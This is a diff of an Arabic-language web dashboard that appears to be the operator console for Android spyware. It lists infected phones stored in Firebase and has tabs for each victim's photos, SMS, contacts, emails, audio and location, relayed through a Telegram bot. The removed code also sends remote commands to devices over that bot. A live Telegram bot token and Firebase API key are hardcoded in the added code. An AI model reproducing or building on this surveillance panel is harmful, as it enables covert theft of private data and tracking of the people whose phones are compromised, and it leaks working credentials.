-    <div class="pill ${d.isActive?'act':'ina'}">${d.isActive?'🟢':'🔴'}</div>
-   </div>
-   <div class="dr2"><div><b>Android:</b> ${esc(d.android)}</div><div><b>آخر ظهور:</b> ${ls}</div><div><b>ID:</b> ${esc(d.id)}</div></div>
-  </div>`}).join(''):'<div class="empty"><div class="ic">📭</div><p>لا أجهزة مسجّلة بعد</p></div>';
- }
- const pick=document.getElementById('devPick');
- if(pick)pick.innerHTML='<option value="">— اختر جهازًا —</option>'+devices.map(d=>`<option value="${esc(d.id)}" ${selectedDevice&&selectedDevice.id===d.id?'selected':''}>${esc(devName(d))}${d.isActive?' 🟢':''}</option>`).join('');
+// ═══════════════════════════════════════════
+//  الإعدادات
+// ═══════════════════════════════════════════
+const TELEGRAM_BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
+const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
+const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";
+
+const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
+const FS_DEVICES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`;
+const FS_MESSAGES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;
+
+let currentDevice = null;
+let allMessages = [];
+let deviceNames = JSON.parse(localStorage.getItem('device_names') || '{}');
+
+// ═══════════════════════════════════════════
+//  Toast
+// ═══════════════════════════════════════════
+function toast(msg, type='ok') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast show ' + type;
+    clearTimeout(window.__tt);
+    window.__tt = setTimeout(() => t.classList.remove('show'), 2500);
 }
-async function loadDevices(){
- try{
-  const res=await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`),data=await res.json(),docs=data.documents||[];
-  devices=docs.map(d=>{const f=d.fields||{},ls=parseInt(f.last_seen_ms?.integerValue||'0');return{id:f.id?.stringValue||'',brand:f.brand?.stringValue||'',manufacturer:f.manufacturer?.stringValue||'',model:f.model?.stringValue||'',android:f.android?.stringValue||'',lastSeen:ls,isActive:(Date.now()-ls)<10*60*1000}}).sort((a,b)=>b.lastSeen-a.lastSeen);
-  document.getElementById('statDevices').textContent=devices.length;
-  document.getElementById('statActive').textContent=devices.filter(d=>d.isActive).length;
-  if(selectedDevice){const f=devices.find(d=>d.id===selectedDevice.id);if(f)selectedDevice=f}
-  fillDevices();
- }catch(e){const l=document.getElementById('devicesList');if(l)l.innerHTML='<div class="empty"><div class="ic">⚠️</div><p>تعذّر تحميل الأجهزة</p></div>'}
+
+// ═══════════════════════════════════════════
+//  Load Devices
+// ═══════════════════════════════════════════
+async function loadDevices() {
+    try {
+        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
+        const data = await res.json();
+        const docs = data.documents || [];
+
+        const list = document.getElementById('devicesList');
+
+        if (docs.length === 0) {
+            list.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
+                <div class="icon">📭</div>
+                <div>لا أجهزة مسجّلة بعد</div>
+            </div>`;
+            document.getElementById('statDevices').textContent = '0';
+            document.getElementById('deviceCount').textContent = '0';
+            return;
+        }
+
+        const devices = docs.map(d => {
+            const f = d.fields || {};
+            const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
+            return {
+                id: f.id?.stringValue || '',
+                brand: f.brand?.stringValue || '',
+                manufacturer: f.manufacturer?.stringValue || '',
+                model: f.model?.stringValue || '',
+                android: f.android?.stringValue || '',
+                lastSeen: lastSeen,
+                isActive: (Date.now() - lastSeen) < 10 * 60 * 1000
+            };
+        }).sort((a, b) => b.lastSeen - a.lastSeen);
+
+        document.getElementById('statDevices').textContent = devices.length;
+        document.getElementById('deviceCount').textContent = devices.length;
+
+        list.innerHTML = '';
+        for (const d of devices) list.appendChild(buildDeviceCard(d));
+    } catch (e) {
+        console.error(e);
+    }
 }
-function renameDevice(inp,id){const n=inp.value.trim();if(n)deviceNames[id]=n;else delete deviceNames[id];localStorage.setItem('device_names',JSON.stringify(deviceNames));toast('✅ تم حفظ الاسم','ok');fillDevices()}
-function selectDevice(id){const d=devices.find(x=>x.id===id);if(!d)return;selectedDevice=d;renderView();toast('✅ تم اختيار: '+devName(d),'ok')}
-function pickDevice(id){if(!id){selectedDevice=null;renderView();return}selectDevice(id)}
-function clearSelection(){selectedDevice=null;renderView()}
-async function sendCmd(cmd){
- if(!selectedDevice){toast('⚠️ اختر جهازًا أولًا','err');return}
- toast(`⏳ إرسال: ${cmd}`,'wait');
- try{
-  const res=await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:`${cmd} #${selectedDevice.id}`})}),data=await res.json();
-  if(data.ok){toast(`✅ ${cmd}`,'ok');setTimeout(()=>{pullIncoming();loadMessages(false)},2500)}
-  else toast(`❌ ${data.description}`,'err');
- }catch(e){toast(`❌ ${e.message}`,'err')}
+
+function buildDeviceCard(d) {
+    const card = document.createElement('div');
+    card.className = 'device' + (d.isActive ? '' : ' inactive');
+    card.onclick = () => openDevice(d);
+
+    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
+
+    card.innerHTML = `
+        <div class="status"></div>
+        <div class="name">${escapeHtml(customName)}</div>
+        <div class="meta">Android ${escapeHtml(d.android)}</div>
+        <div class="meta">${escapeHtml(d.id)}</div>
+    `;
+    return card;
 }
-async function pullIncoming(){
- try{
-  const off=lastUpdateId===0?0:lastUpdateId+1,res=await fetch(`${TG_API}/getUpdates?offset=${off}&limit=100`),data=await res.json();
-  if(!data.ok)return;
-  for(const u of(data.result||[])){
-   lastUpdateId=Math.max(lastUpdateId,u.update_id);
-   const m=u.message;if(!m)continue;
-   const key=`in_${m.message_id}`;if(messageCache[key])continue;messageCache[key]=true;
-   if(m.text)await saveToFS({chat_id:m.chat.id,type:'text',text:m.text,time_ms:m.date*1000,from_user:true});
-   else if(m.photo&&m.photo.length>0)await saveToFS({chat_id:m.chat.id,type:'photo',file_id:m.photo[m.photo.length-1].file_id,caption:m.caption||'',time_ms:m.date*1000,from_user:true});
-  }
- }catch(e){}
+
+// ═══════════════════════════════════════════
+//  Open Device
+// ═══════════════════════════════════════════
+async function openDevice(d) {
+    currentDevice = d;
+    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
+
+    document.getElementById('detailName').textContent = customName;
+    document.getElementById('detailId').textContent = d.id;
+    document.getElementById('detail').classList.add('open');
+    document.getElementById('detail').scrollIntoView({ behavior: 'smooth' });
+
+    // Load messages
+    await loadMessages();
+
+    // Render photos (default tab)
+    renderPhotos();
 }
-async function saveToFS(o){
- try{
-  const f={};for(const[k,v]of Object.entries(o)){if(typeof v==='number')f[k]={integerValue:String(v)};else if(typeof v==='boolean')f[k]={booleanValue:v};else f[k]={stringValue:String(v)}}
-  await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields:f})});
- }catch(e){}
+
+function closeDetail() {
+    document.getElementById('detail').classList.remove('open');
+    currentDevice = null;
 }
-async function loadMessages(showT){
- if(showT)toast('⏳ جلب الرسائل...','wait');
- try{
-  const res=await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`),data=await res.json();
-  allMessages=(data.documents||[]).map(d=>{const f=d.fields||{};return{type:f.type?.stringValue||'text',text:f.text?.stringValue||'',file_id:f.file_id?.stringValue||'',caption:f.caption?.stringValue||'',time_ms:parseInt(f.time_ms?.integerValue||'0'),from_user:f.from_user?.booleanValue||false}}).sort((a,b)=>a.time_ms-b.time_ms);
-  document.getElementById('statMsgs').textContent=allMessages.length;
-  renderCurrentLog();
-  if(showT)toast(`✅ ${allMessages.length} رسالة`,'ok');
- }catch(e){if(showT)toast(`❌ ${e.message}`,'err')}
+
+// ═══════════════════════════════════════════
+//  Tabs
+// ═══════════════════════════════════════════
+function switchTab(el, tabName) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
+    el.classList.add('on');
+
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('on'));
+    document.getElementById('tab-' + tabName).classList.add('on');
+
+    // Re-render specific tab
+    if (tabName === 'photos') renderPhotos();
+    else if (tabName === 'sms') renderSms();
+    else if (tabName === 'contacts') renderContacts();
+    else if (tabName === 'emails') renderEmails();
+    else if (tabName === 'music') renderMusic();
+    else if (tabName === 'location') renderLocation();
 }
-function matchSec(m,k){const s=SEC[k];const txt=(m.text+' '+m.caption).toLowerCase();if(s.photo&&m.type==='photo')return true;return s.kw.some(w=>txt.includes(w.toLowerCase()))}
-function renderCurrentLog(){
- const body=document.getElementById('logBody');if(!body)return;
- let list=allMessages;
- if(currentTab!=='home')list=allMessages.filter(m=>matchSec(m,currentTab));
- if(!list.length){body.innerHTML='<div class="lemp"><div class="ic">📭</div><p>لا يوجد نشاط في هذا القسم بعد</p></div>';return}
- body.innerHTML='';
- for(const m of list){
-  const isBot=!m.from_user,isPhoto=m.type==='photo';
-  const time=new Date(m.time_ms).toLocaleString('ar-EG',{hour:'2-digit',minute:'2-digit',day:'2-digit',month:'2-digit'});
-  const e=document.createElement('div');
-  e.className='le '+(isBot?'fb':'fu')+(isPhoto?' fp':'');
-  let av=isBot?'🤖':'👤';if(isPhoto)av='📸';
-  let inner='';
-  if(isPhoto&&m.file_id){inner=`<div class="bd">📸 صورة${m.caption?' — '+esc(m.caption):''}</div><img data-file="${esc(m.file_id)}" onclick="openModal(this.src)">`}
-  else inner=`<div class="bd">${esc(m.text)}</div>`;
-  e.innerHTML=`<div class="av">${av}</div><div class="co"><div class="mt"><span class="who">${isBot?'البوت':'أنت'}</span><span class="whn">${time}</span></div>${inner}</div>`;
-  body.appendChild(e);
-  const img=e.querySelector('img[data-file]');if(img)loadMedia(m.file_id,img);
- }
- body.scrollTop=body.scrollHeight;
+
+// ═══════════════════════════════════════════
+//  Load Messages
+// ═══════════════════════════════════════════
+async function loadMessages() {
+    try {
+        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`);
+        const data = await res.json();
+        allMessages = (data.documents || []).map(d => {
+            const f = d.fields || {};
+            return {
+                type: f.type?.stringValue || 'text',
+                text: f.text?.stringValue || '',
+                file_id: f.file_id?.stringValue || '',
+                caption: f.caption?.stringValue || '',
+                time_ms: parseInt(f.time_ms?.integerValue || '0'),
+                from_user: f.from_user?.booleanValue || false
+            };
+        }).sort((a, b) => a.time_ms - b.time_ms);
+
+        document.getElementById('statMessages').textContent = allMessages.length;
+        document.getElementById('statPhotos').textContent = allMessages.filter(m => m.type === 'photo').length;
+    } catch (e) {
+        console.error(e);
+    }
 }
-async function loadMedia(fid,el){try{const r=await fetch(`${TG_API}/getFile?file_id=${fid}`),d=await r.json();if(d.ok&&d.result.file_path)el.src=`${TG_FILE}/${d.result.file_path}`}catch(e){}}
-function openModal(src){document.getElementById('modalImg').src=src;document.getElementById('imgModal').classList.add('show')}
-function closeModal(){document.getElementById('imgModal').classList.remove('show')}
-async function refresh(){await pullIncoming();await loadMessages(false)}
-renderTabs();renderView();
-loadDevices();loadMessages(false);refresh();
-setInterval(loadDevices,20000);
-setInterval(refresh,15000);
+
+// ═══════════════════════════════════════════
+//  Render Photos (Gallery Grid)
+// ═══════════════════════════════════════════
+function renderPhotos() {
+    const grid = document.getElementById('photosGrid');
+    const photos = allMessages.filter(m => m.type === 'photo' && m.file_id);
+
+    if (photos.length === 0) {
+        grid.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
+            <div class="icon">📭</div>
+            <div>لا توجد صور</div>
+        </div>`;
+        return;
+    }
+
+    grid.innerHTML = '';
+    for (const p of photos) {
+        const img = document.createElement('img');
+        img.dataset.file = p.file_id;
+        img.alt = p.caption || 'photo';
+        img.onclick = () => openModal(img.src);
+        grid.appendChild(img);
+        loadMedia(p.file_id, img);
+    }
+}
+
+// ═══════════════════════════════════════════
+//  Render SMS
+// ═══════════════════════════════════════════
+function renderSms() {
+    const list = document.getElementById('smsList');
+    const sms = allMessages.filter(m => m.type === 'sms' || (m.text && m.text.includes('📩 SMS من')));
+
+    if (sms.length === 0) {
+        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد رسائل SMS</div></div>`;
+        return;
+    }
+
+    list.innerHTML = '';
+    for (const s of sms) {
+        const div = document.createElement('div');
+        div.className = 'list-item';
+        div.innerHTML = `
+            <div class="title">📩 رسالة</div>
+            <div class="text">${escapeHtml(s.text || s.caption)}</div>
+            <div class="meta">${new Date(s.time_ms).toLocaleString('ar-EG')}</div>
+        `;
+        list.appendChild(div);
+    }
+}
+
+// ═══════════════════════════════════════════
+//  Render Contacts
+// ═══════════════════════════════════════════
+function renderContacts() {
+    const list = document.getElementById('contactsList');
+    const contacts = allMessages.filter(m => m.text && m.text.includes('👥'));
+
+    if (contacts.length === 0) {
+        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد جهات اتصال</div></div>`;
+        return;
+    }
+
+    list.innerHTML = '';
+    for (const c of contacts) {
+        const div = document.createElement('div');
+        div.className = 'list-item';
+        div.innerHTML = `
+            <div class="text">${escapeHtml(c.text)}</div>
+            <div class="meta">${new Date(c.time_ms).toLocaleString('ar-EG')}</div>
+        `;
+        list.appendChild(div);
+    }
+}
+
+function renderEmails() {
+    const list = document.getElementById('emailsList');
+    const emails = allMessages.filter(m => m.text && m.text.includes('📧'));
+
+    if (emails.length === 0) {
+        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد إيميلات</div></div>`;
+        return;
+    }
+
+    list.innerHTML = '';
+    for (const e of emails) {
+        const div = document.createElement('div');
+        div.className = 'list-item';
+        div.innerHTML = `
+            <div class="text">${escapeHtml(e.text)}</div>
+            <div class="meta">${new Date(e.time_ms).toLocaleString('ar-EG')}</div>
+        `;
+        list.appendChild(div);
+    }
+}
+
+function renderMusic() {
+    const list = document.getElementById('musicList');
+    const music = allMessages.filter(m => m.type === 'audio');
+
+    if (music.length === 0) {
+        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد موسيقى</div></div>`;
+        return;
+    }
+
+    list.innerHTML = '';
+    for (const m of music) {
+        const div = document.createElement('div');
+        div.className = 'list-item';
+        div.innerHTML = `
+            <div class="title">🎵 مقطع صوتي</div>
+            <audio controls data-file="${escapeAttr(m.file_id)}" style="width:100%;margin-top:8px"></audio>
+            <div class="meta">${new Date(m.time_ms).toLocaleString('ar-EG')}</div>
+        `;
+        list.appendChild(div);
+        const audio = div.querySelector('audio');
+        loadMedia(m.file_id, audio);
+    }
+}
+
+function renderLocation() {
+    const list = document.getElementById('locationList');
+    const locations = allMessages.filter(m => m.text && m.text.includes('📍'));
+
+    if (locations.length === 0) {
+        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا يوجد موقع</div></div>`;
+        return;
+    }
+
+    list.innerHTML = '';
+    for (const l of locations.reverse()) {
+        const div = document.createElement('div');
+        div.className = 'list-item';
+        div.innerHTML = `
+            <div class="text">${escapeHtml(l.text).replace(/\n/g, '<br>')}</div>
+            <div class="meta">${new Date(l.time_ms).toLocaleString('ar-EG')}</div>
+        `;
+        list.appendChild(div);
+    }
+}
+
+// ═══════════════════════════════════════════
+//  Media Loader
+// ═══════════════════════════════════════════
+async function loadMedia(fileId, el) {
+    try {
+        const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
+        const data = await res.json();
+        if (data.ok && data.result.file_path) {
+            el.src = `${TG_FILE}/${data.result.file_path}`;
+        }
+    } catch (e) {}
+}
+
+// ═══════════════════════════════════════════
+//  Modal
+// ═══════════════════════════════════════════
+function openModal(src) {
+    document.getElementById('modalImg').src = src;
+    document.getElementById('imgModal').classList.add('show');
+}
+function closeModal() {
+    document.getElementById('imgModal').classList.remove('show');
+}
+
+// ═══════════════════════════════════════════
+//  Helpers
+// ═══════════════════════════════════════════
+function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function escapeAttr(s) {
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+async function loadAll() {
+    toast('جاري التحديث...');
+    await loadDevices();
+    if (currentDevice) await loadMessages();
+    toast('✅ تم التحديث', 'ok');
+}
+
+// Start
+loadDevices();
+setInterval(loadDevices, 30000);
 </script>
 </body>
 </html>
